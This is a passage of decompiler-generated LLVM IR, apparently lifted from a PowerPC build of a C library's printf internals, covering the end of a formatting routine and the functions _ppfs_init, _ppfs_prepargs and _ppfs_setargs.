dec_label_pc_1000e958:                            ; preds = %dec_label_pc_1000e924
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000e99c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e99c

dec_label_pc_1000e964:                            ; preds = %dec_label_pc_1000e99c
  %tmp78 = icmp ult i32 %v0_1000e9b4, 129
  br i1 %tmp78, label %dec_label_pc_1000e96c, label %dec_label_pc_1000e968

dec_label_pc_1000e968:                            ; preds = %dec_label_pc_1000e964
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000e96c

dec_label_pc_1000e96c:                            ; preds = %dec_label_pc_1000e964, %dec_label_pc_1000e968
  store i32 ptrtoint (i32* @global_var_1000e970.1049 to i32), i32* @lr, align 4
  %v0_1000e96c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e96c, i32* @r30, align 4
  %v3_1000e974 = icmp eq i32 %v0_1000e96c, 0
  br i1 %v3_1000e974, label %dec_label_pc_1000e990, label %dec_label_pc_1000e988

dec_label_pc_1000e988:                            ; preds = %dec_label_pc_1000e96c
  %v0_1000e978 = load i32, i32* %r24.global-to-local, align 4
  store i32 268495244, i32* @lr, align 4
  %v3_1000e988 = inttoptr i32 %v0_1000e978 to i16*
  %v4_1000e988 = call i32 @__stdio_fwrite(i32 %v2_1000e84c, i32 %v0_1000e96c, i16* %v3_1000e988)
  store i32 %v4_1000e988, i32* %r0.global-to-local, align 4
  %v1_1000e990.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e990

dec_label_pc_1000e990:                            ; preds = %dec_label_pc_1000e96c, %dec_label_pc_1000e988
  %v1_1000e990 = phi i32 [ 0, %dec_label_pc_1000e96c ], [ %v1_1000e990.pre, %dec_label_pc_1000e988 ]
  %v0_1000e994 = phi i32 [ 0, %dec_label_pc_1000e96c ], [ %v4_1000e988, %dec_label_pc_1000e988 ]
  %v4_1000e990 = icmp eq i32 %v0_1000e994, %v1_1000e990
  %v1_1000e994 = load i32, i32* @r31, align 4
  %v2_1000e994 = sub i32 %v1_1000e994, %v0_1000e994
  store i32 %v2_1000e994, i32* @r31, align 4
  br i1 %v4_1000e990, label %dec_label_pc_1000e99c, label %dec_label_pc_1000e9e8

dec_label_pc_1000e99c:                            ; preds = %dec_label_pc_1000e990, %dec_label_pc_1000e958
  %v0_1000e9b4 = phi i32 [ %v2_1000e994, %dec_label_pc_1000e990 ], [ %v0_1000e99c.pre, %dec_label_pc_1000e958 ]
  %v3_1000e99c = icmp eq i32 %v0_1000e9b4, 0
  store i32 %v2_1000e84c, i32* @r29, align 4
  store i32 %v2_1000e76c, i32* @r4, align 4
  store i32 %v2_1000e770, i32* @r6, align 4
  store i32 %v2_1000e84c, i32* @r3, align 4
  store i32 %v0_1000e9b4, i32* @r5, align 4
  br i1 %v3_1000e99c, label %dec_label_pc_1000e9bc, label %dec_label_pc_1000e964

dec_label_pc_1000e9bc:                            ; preds = %dec_label_pc_1000e99c, %dec_label_pc_1000e94c.thread, %dec_label_pc_1000e94c
  %v0_1000e9bc = load i32, i32* %r24.global-to-local, align 4
  %v0_1000e9c4 = load i32, i32* @r28, align 4
  store i32 268495308, i32* @lr, align 4
  %v4_1000e9c8 = call i32 @_charpad(i32 %v0_1000e9bc, i8 32, i32 %v0_1000e9c4)
  %v1_1000e9cc = load i32, i32* @r28, align 4
  %v4_1000e9cc = icmp eq i32 %v4_1000e9c8, %v1_1000e9cc
  br i1 %v4_1000e9cc, label %dec_label_pc_1000e9d4, label %dec_label_pc_1000e9e8

dec_label_pc_1000e9d4:                            ; preds = %dec_label_pc_1000e9bc, %dec_label_pc_1000e724, %dec_label_pc_1000e4f8
  %stack_var_-184.2 = phi i32 [ %v0_1000e62c, %dec_label_pc_1000e4f8 ], [ %stack_var_-184.1, %dec_label_pc_1000e9bc ], [ %v0_1000e62c, %dec_label_pc_1000e724 ]
  %v3_1000e9d4 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000e9d4 = ptrtoint i8* %v3_1000e9d4 to i32
  store i32 %v4_1000e9d4, i32* @r29, align 4
  br label %dec_label_pc_1000e9d8

dec_label_pc_1000e9d8:                            ; preds = %dec_label_pc_1000e3ec, %dec_label_pc_1000e9d4
  %v0_1000e9d8 = phi i32 [ %v0_1000e9d8.pre, %dec_label_pc_1000e3ec ], [ %v4_1000e9d4, %dec_label_pc_1000e9d4 ]
  %v0_1000e62c = phi i32 [ %tmp56, %dec_label_pc_1000e3ec ], [ %stack_var_-184.2, %dec_label_pc_1000e9d4 ]
  br label %dec_label_pc_1000e404

dec_label_pc_1000e9e8:                            ; preds = %dec_label_pc_1000e840, %dec_label_pc_1000e9bc, %dec_label_pc_1000e94c, %dec_label_pc_1000e8f8, %dec_label_pc_1000e8dc, %dec_label_pc_1000e79c, %dec_label_pc_1000e76c, %dec_label_pc_1000e700, %dec_label_pc_1000e440, %dec_label_pc_1000e990
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000e9ec

dec_label_pc_1000e9ec:                            ; preds = %dec_label_pc_1000e44c, %dec_label_pc_1000e3c4, %dec_label_pc_1000e3dc, %dec_label_pc_1000e9e8
  store i32 %v0_1000e398, i32* %r0.global-to-local, align 4
  %v0_1000e9f0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000e9f0

; uselistorder directives
  uselistorder i32 %v0_1000e62c, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000e9b4, { 1, 2, 0 }
  uselistorder i32 %v1_1000e8c8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000e858, { 1, 0 }
  uselistorder i32 %v2_1000e7e8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000e748, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000e62c, { 1, 0 }
  uselistorder i32 %v6_1000e5e4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1000e5c8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000e5b4, { 1, 0 }
  uselistorder i32 %v1_1000e558, { 1, 0 }
  uselistorder i1 %v2_1000e54c, { 1, 0 }
  uselistorder i32 %v0_1000e4fc, { 1, 0, 2 }
  uselistorder i32 %v1_1000e4e8, { 1, 0 }
  uselistorder i32 %v0_1000e4e0, { 1, 0 }
  uselistorder i32 %v1_1000e4dc, { 1, 0 }
  uselistorder i32 %v1_1000e458, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000e420, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000e430, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000e84c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000e494, { 1, 2, 0 }
  uselistorder i32 %v4_1000e48c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e9ec, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e9e8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000e9d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e990, { 1, 0 }
  uselistorder label %dec_label_pc_1000e96c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e884, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e884thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000e878, { 1, 0 }
  uselistorder label %dec_label_pc_1000e808, { 1, 0 }
  uselistorder label %dec_label_pc_1000e7f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e76c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6a4, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000e654, { 1, 0 }
  uselistorder label %dec_label_pc_1000e638, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000e5c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e594, { 1, 0 }
  uselistorder label %dec_label_pc_1000e590, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e564, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e4ec, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e44c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e440, { 1, 0 }
  uselistorder label %dec_label_pc_1000e404, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000ea08 = load i32, i32* @lr, align 4
  store i32 %v0_1000ea08, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000ea18 = load i32, i32* @r4, align 4
  store i32 %v0_1000ea18, i32* @r30, align 4
  store i32 268495400, i32* @lr, align 4
  %v3_1000ea24 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000ea28 = load i32, i32* @r31, align 4
  %v1_1000ea28 = add i32 %v0_1000ea28, 24
  %v2_1000ea28 = inttoptr i32 %v1_1000ea28 to i32*
  %v3_1000ea28 = load i32, i32* %v2_1000ea28, align 4
  store i32 %v3_1000ea28, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000ea30 = load i32, i32* @r30, align 4
  %v2_1000ea30 = inttoptr i32 %v0_1000ea28 to i32*
  store i32 %v0_1000ea30, i32* %v2_1000ea30, align 4
  %v0_1000ea34 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ea34, i32* %ctr.global-to-local, align 4
  %v0_1000ea38 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ea38 = add i32 %v0_1000ea38, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000ea40 = load i32, i32* @r31, align 4
  %v2_1000ea40 = add i32 %v1_1000ea40, 24
  %v3_1000ea40 = inttoptr i32 %v2_1000ea40 to i32*
  store i32 %v1_1000ea38, i32* %v3_1000ea40, align 4
  %v0_1000ea44 = load i32, i32* @r31, align 4
  %v1_1000ea44 = add i32 %v0_1000ea44, 40
  store i32 %v1_1000ea44, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ea48

dec_label_pc_1000ea48:                            ; preds = %dec_label_pc_1000ea48, %entry
  %v1_1000ea48 = phi i32 [ %v1_1000ea4c, %dec_label_pc_1000ea48 ], [ %v1_1000ea44, %entry ]
  %v0_1000ea48 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ea48 = inttoptr i32 %v1_1000ea48 to i32*
  store i32 %v0_1000ea48, i32* %v2_1000ea48, align 4
  %v0_1000ea4c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ea4c = add i32 %v0_1000ea4c, 4
  store i32 %v1_1000ea4c, i32* %r9.global-to-local, align 4
  %v0_1000ea50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ea50 = add i32 %v0_1000ea50, -1
  store i32 %v1_1000ea50, i32* %ctr.global-to-local, align 4
  %v2_1000ea50 = icmp eq i32 %v1_1000ea50, 0
  br i1 %v2_1000ea50, label %dec_label_pc_1000ea54, label %dec_label_pc_1000ea48

dec_label_pc_1000ea54:                            ; preds = %dec_label_pc_1000ea48
  %v0_1000ea54 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000ea94

dec_label_pc_1000ea64:                            ; preds = %dec_label_pc_1000ea94
  %v3_1000ea9c = icmp eq i8 %v2_1000ea94, 37
  br i1 %v3_1000ea9c, label %dec_label_pc_1000ea68, label %dec_label_pc_1000ea90

dec_label_pc_1000ea68:                            ; preds = %dec_label_pc_1000ea64
  %v1_1000ea68 = add i32 %v0_1000ea68, 1
  %v2_1000ea68 = inttoptr i32 %v1_1000ea68 to i8*
  %v3_1000ea68 = load i8, i8* %v2_1000ea68, align 1
  %v4_1000ea68 = zext i8 %v3_1000ea68 to i32
  store i32 %v4_1000ea68, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ea68, i32* %r9.global-to-local, align 4
  %v3_1000ea70 = icmp eq i8 %v3_1000ea68, 37
  br i1 %v3_1000ea70, label %dec_label_pc_1000ea90, label %dec_label_pc_1000ea78

dec_label_pc_1000ea78:                            ; preds = %dec_label_pc_1000ea68
  %v0_1000ea6c = load i32, i32* @r31, align 4
  %v2_1000ea78 = inttoptr i32 %v0_1000ea6c to i32*
  store i32 %v1_1000ea68, i32* %v2_1000ea78, align 4
  store i32 268495488, i32* @lr, align 4
  %v1_1000ea7c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ea7c = call i32 @_ppfs_parsespec(i32* %v2_1000ea78, i32 %v1_1000ea7c)
  %v1_1000ea80 = icmp slt i32 %v3_1000ea7c, 0
  br i1 %v1_1000ea80, label %dec_label_pc_1000eaac, label %dec_label_pc_1000ea88

dec_label_pc_1000ea88:                            ; preds = %dec_label_pc_1000ea78
  %v0_1000ea88 = load i32, i32* @r31, align 4
  %v1_1000ea88 = inttoptr i32 %v0_1000ea88 to i32*
  %v2_1000ea88 = load i32, i32* %v1_1000ea88, align 4
  br label %dec_label_pc_1000ea94

dec_label_pc_1000ea90:                            ; preds = %dec_label_pc_1000ea64, %dec_label_pc_1000ea68
  %v0_1000ea90 = phi i32 [ %v0_1000ea68, %dec_label_pc_1000ea64 ], [ %v1_1000ea68, %dec_label_pc_1000ea68 ]
  %v1_1000ea90 = add i32 %v0_1000ea90, 1
  br label %dec_label_pc_1000ea94

dec_label_pc_1000ea94:                            ; preds = %dec_label_pc_1000ea88, %dec_label_pc_1000ea90, %dec_label_pc_1000ea54
  %v0_1000ea68 = phi i32 [ %v0_1000ea54, %dec_label_pc_1000ea54 ], [ %v1_1000ea90, %dec_label_pc_1000ea90 ], [ %v2_1000ea88, %dec_label_pc_1000ea88 ]
  store i32 %v0_1000ea68, i32* %r9.global-to-local, align 4
  %v1_1000ea94 = inttoptr i32 %v0_1000ea68 to i8*
  %v2_1000ea94 = load i8, i8* %v1_1000ea94, align 1
  %v3_1000ea94 = zext i8 %v2_1000ea94 to i32
  store i32 %v3_1000ea94, i32* %r0.global-to-local, align 4
  %v3_1000ea98 = icmp eq i8 %v2_1000ea94, 0
  br i1 %v3_1000ea98, label %dec_label_pc_1000eaa4, label %dec_label_pc_1000ea64

dec_label_pc_1000eaa4:                            ; preds = %dec_label_pc_1000ea94
  %v0_1000eaa4 = load i32, i32* @r30, align 4
  %v1_1000eaa4 = load i32, i32* @r31, align 4
  %v2_1000eaa4 = inttoptr i32 %v1_1000eaa4 to i32*
  store i32 %v0_1000eaa4, i32* %v2_1000eaa4, align 4
  br label %dec_label_pc_1000eaac

dec_label_pc_1000eaac:                            ; preds = %dec_label_pc_1000ea78, %dec_label_pc_1000eaa4
  %storemerge = phi i32 [ 0, %dec_label_pc_1000eaa4 ], [ -1, %dec_label_pc_1000ea78 ]
  store i32 %v0_1000ea08, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000ea94, { 1, 2, 0 }
  uselistorder i32 %v0_1000ea68, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000ea50, { 1, 0 }
  uselistorder i32 %v1_1000ea4c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000eaac, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ea90, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000eac0 = load i32, i32* @lr, align 4
  %v0_1000eac8 = load i32, i32* @r3, align 4
  store i32 %v0_1000eac8, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000eae4 = add i32 %v0_1000eac8, 24
  %v2_1000eae4 = inttoptr i32 %v1_1000eae4 to i32*
  %v3_1000eae4 = load i32, i32* %v2_1000eae4, align 4
  store i32 %v3_1000eae4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000eae4, 1
  br i1 %tmp4, label %dec_label_pc_1000eb08, label %dec_label_pc_1000eaf0

dec_label_pc_1000eaf0:                            ; preds = %entry
  %v2_1000eaf0 = add i32 %v0_1000eac8, 8
  %v3_1000eaf0 = inttoptr i32 %v2_1000eaf0 to i32*
  store i32 0, i32* %v3_1000eaf0, align 4
  %v0_1000eaf4 = load i32, i32* @r30, align 4
  %v1_1000eaf4 = load i32, i32* @r3, align 4
  %v2_1000eaf4 = add i32 %v1_1000eaf4, 28
  %v3_1000eaf4 = inttoptr i32 %v2_1000eaf4 to i32*
  store i32 %v0_1000eaf4, i32* %v3_1000eaf4, align 4
  %v0_1000eaf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eaf8 = load i32, i32* @r3, align 4
  %v2_1000eaf8 = add i32 %v1_1000eaf8, 24
  %v3_1000eaf8 = inttoptr i32 %v2_1000eaf8 to i32*
  store i32 %v0_1000eaf8, i32* %v3_1000eaf8, align 4
  %v0_1000eafc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eafc = load i32, i32* @r3, align 4
  %v2_1000eafc = add i32 %v1_1000eafc, 4
  %v3_1000eafc = inttoptr i32 %v2_1000eafc to i32*
  store i32 %v0_1000eafc, i32* %v3_1000eafc, align 4
  store i32 268495620, i32* @lr, align 4
  %v0_1000eb00 = call i32 @_ppfs_setargs()
  store i32 %v0_1000eb00, i32* %r3.global-to-local, align 4
  %v0_1000eb04 = load i32, i32* @r30, align 4
  %v1_1000eb04 = load i32, i32* @r31, align 4
  %v2_1000eb04 = add i32 %v1_1000eb04, 24
  %v3_1000eb04 = inttoptr i32 %v2_1000eb04 to i32*
  store i32 %v0_1000eb04, i32* %v3_1000eb04, align 4
  %v0_1000eb18.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000eb08

dec_label_pc_1000eb08:                            ; preds = %entry, %dec_label_pc_1000eaf0
  %v0_1000eb18 = phi i32 [ %v0_1000eac8, %entry ], [ %v0_1000eb18.pre, %dec_label_pc_1000eaf0 ]
  store i32 %v0_1000eac0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000eb18

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb08, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000eb1c = load i32, i32* @r3, align 4
  %v1_1000eb1c = add i32 %v0_1000eb1c, 24
  %v2_1000eb1c = inttoptr i32 %v1_1000eb1c to i32*
  %v3_1000eb1c = load i32, i32* %v2_1000eb1c, align 4
  store i32 %v3_1000eb1c, i32* %r0.global-to-local, align 4
  %v1_1000eb20 = add i32 %v0_1000eb1c, 88
  store i32 %v1_1000eb20, i32* %r8.global-to-local, align 4
  %v1_1000eb24 = add i32 %v0_1000eb1c, 8
  %v2_1000eb24 = inttoptr i32 %v1_1000eb24 to i32*
  %v3_1000eb24 = load i32, i32* %v2_1000eb24, align 4
  store i32 %v3_1000eb24, i32* %r9.global-to-local, align 4
  %v2_1000eb28 = icmp sgt i32 %v3_1000eb1c, 0
  %v3_1000eb28 = icmp eq i32 %v3_1000eb1c, 0
  store i1 %v2_1000eb28, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000eb28, label %dec_label_pc_1000eb30, label %dec_label_pc_1000ed1c

dec_label_pc_1000eb30:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000eb34 = icmp ne i32 %v3_1000eb24, -2147483648
  %v4_1000eb34 = icmp eq i32 %v3_1000eb24, -2147483648
  store i1 %v3_1000eb34, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000eb34, label %dec_label_pc_1000eb3c, label %dec_label_pc_1000eb7c

dec_label_pc_1000eb3c:                            ; preds = %dec_label_pc_1000eb30
  %v1_1000eb3c = add i32 %v0_1000eb1c, 76
  %v2_1000eb3c = inttoptr i32 %v1_1000eb3c to i8*
  %v3_1000eb3c = load i8, i8* %v2_1000eb3c, align 1
  %v4_1000eb3c = zext i8 %v3_1000eb3c to i32
  store i32 %v4_1000eb3c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000eb3c, i32* %r11.global-to-local, align 4
  %v2_1000eb44 = icmp ugt i8 %v3_1000eb3c, 8
  store i1 %v2_1000eb44, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000eb3c, 7
  br i1 %tmp, label %dec_label_pc_1000eb64, label %dec_label_pc_1000eb4c

dec_label_pc_1000eb4c:                            ; preds = %dec_label_pc_1000eb3c
  %v1_1000eb4c = add i32 %v0_1000eb1c, 84
  %v2_1000eb4c = inttoptr i32 %v1_1000eb4c to i32*
  %v3_1000eb4c = load i32, i32* %v2_1000eb4c, align 4
  %v1_1000eb50 = mul nuw nsw i32 %v4_1000eb3c, 4
  %v2_1000eb54 = add i32 %v3_1000eb4c, %v1_1000eb50
  store i32 %v2_1000eb54, i32* %r9.global-to-local, align 4
  %v1_1000eb58 = add nuw nsw i32 %v4_1000eb3c, 1
  store i32 %v1_1000eb58, i32* %r0.global-to-local, align 4
  %v1_1000eb5c = trunc i32 %v1_1000eb58 to i8
  store i8 %v1_1000eb5c, i8* %v2_1000eb3c, align 1
  br label %dec_label_pc_1000eb70

dec_label_pc_1000eb64:                            ; preds = %dec_label_pc_1000eb3c
  %v1_1000eb64 = add i32 %v0_1000eb1c, 80
  %v2_1000eb64 = inttoptr i32 %v1_1000eb64 to i32*
  %v3_1000eb64 = load i32, i32* %v2_1000eb64, align 4
  store i32 %v3_1000eb64, i32* %r9.global-to-local, align 4
  %v1_1000eb68 = add i32 %v3_1000eb64, 4
  store i32 %v1_1000eb68, i32* %r0.global-to-local, align 4
  store i32 %v1_1000eb68, i32* %v2_1000eb64, align 4
  br label %dec_label_pc_1000eb70

dec_label_pc_1000eb70:                            ; preds = %dec_label_pc_1000eb4c, %dec_label_pc_1000eb64
  %v0_1000eb70 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000eb70 = inttoptr i32 %v0_1000eb70 to i32*
  %v2_1000eb70 = load i32, i32* %v1_1000eb70, align 4
  store i32 %v2_1000eb70, i32* %r0.global-to-local, align 4
  %v1_1000eb74 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000eb74 = inttoptr i32 %v1_1000eb74 to i32*
  store i32 %v2_1000eb70, i32* %v2_1000eb74, align 4
  %v0_1000eb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eb78 = load i32, i32* @r3, align 4
  %v2_1000eb78 = add i32 %v1_1000eb78, 8
  %v3_1000eb78 = inttoptr i32 %v2_1000eb78 to i32*
  store i32 %v0_1000eb78, i32* %v3_1000eb78, align 4
  %v0_1000eb7c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000eb7c

dec_label_pc_1000eb7c:                            ; preds = %dec_label_pc_1000eb30, %dec_label_pc_1000eb70
  %v2_1000ebac = phi i32 [ %v0_1000eb1c, %dec_label_pc_1000eb30 ], [ %v0_1000eb7c.pre, %dec_label_pc_1000eb70 ]
  %v1_1000eb7c = add i32 %v2_1000ebac, 4
  %v2_1000eb7c = inttoptr i32 %v1_1000eb7c to i32*
  %v3_1000eb7c = load i32, i32* %v2_1000eb7c, align 4
  store i32 %v3_1000eb7c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000eb84 = icmp ne i32 %v3_1000eb7c, -2147483648
  %v4_1000eb84 = icmp eq i32 %v3_1000eb7c, -2147483648
  store i1 %v3_1000eb84, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000eb84, label %dec_label_pc_1000eb8c, label %dec_label_pc_1000ed0c.preheader

dec_label_pc_1000eb8c:                            ; preds = %dec_label_pc_1000eb7c
  %v1_1000eb8c = add i32 %v2_1000ebac, 76
  %v2_1000eb8c = inttoptr i32 %v1_1000eb8c to i8*
  %v3_1000eb8c = load i8, i8* %v2_1000eb8c, align 1
  %v4_1000eb8c = zext i8 %v3_1000eb8c to i32
  store i32 %v4_1000eb8c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000eb8c, i32* %r11.global-to-local, align 4
  %v2_1000eb94 = icmp ugt i8 %v3_1000eb8c, 8
  store i1 %v2_1000eb94, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000eb8c, 7
  br i1 %tmp22, label %dec_label_pc_1000ebb4, label %dec_label_pc_1000eb9c

dec_label_pc_1000eb9c:                            ; preds = %dec_label_pc_1000eb8c
  %v1_1000eb9c = add i32 %v2_1000ebac, 84
  %v2_1000eb9c = inttoptr i32 %v1_1000eb9c to i32*
  %v3_1000eb9c = load i32, i32* %v2_1000eb9c, align 4
  %v1_1000eba0 = mul nuw nsw i32 %v4_1000eb8c, 4
  %v2_1000eba4 = add i32 %v3_1000eb9c, %v1_1000eba0
  store i32 %v2_1000eba4, i32* %r9.global-to-local, align 4
  %v1_1000eba8 = add nuw nsw i32 %v4_1000eb8c, 1
  store i32 %v1_1000eba8, i32* %r0.global-to-local, align 4
  %v1_1000ebac = trunc i32 %v1_1000eba8 to i8
  store i8 %v1_1000ebac, i8* %v2_1000eb8c, align 1
  br label %dec_label_pc_1000ebc0

dec_label_pc_1000ebb4:                            ; preds = %dec_label_pc_1000eb8c
  %v1_1000ebb4 = add i32 %v2_1000ebac, 80
  %v2_1000ebb4 = inttoptr i32 %v1_1000ebb4 to i32*
  %v3_1000ebb4 = load i32, i32* %v2_1000ebb4, align 4
  store i32 %v3_1000ebb4, i32* %r9.global-to-local, align 4
  %v1_1000ebb8 = add i32 %v3_1000ebb4, 4
  store i32 %v1_1000ebb8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ebb8, i32* %v2_1000ebb4, align 4
  br label %dec_label_pc_1000ebc0

dec_label_pc_1000ebc0:                            ; preds = %dec_label_pc_1000eb9c, %dec_label_pc_1000ebb4
  %v0_1000ebc0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ebc0 = inttoptr i32 %v0_1000ebc0 to i32*
  %v2_1000ebc0 = load i32, i32* %v1_1000ebc0, align 4
  store i32 %v2_1000ebc0, i32* %r0.global-to-local, align 4
  %v1_1000ebc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ebc4 = inttoptr i32 %v1_1000ebc4 to i32*
  store i32 %v2_1000ebc0, i32* %v2_1000ebc4, align 4
  %v0_1000ebc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ebc8 = load i32, i32* @r3, align 4
